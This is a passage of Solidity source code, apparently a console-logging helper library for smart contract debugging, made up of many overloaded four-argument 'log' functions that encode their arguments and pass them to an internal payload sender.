_sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, uint256 p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, uint256 p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, uint256 p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, uint256 p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint256 p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, uint256 p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, uint256 p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, uint256 p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, uint256 p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint256 p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, uint256 p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, uint256 p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address 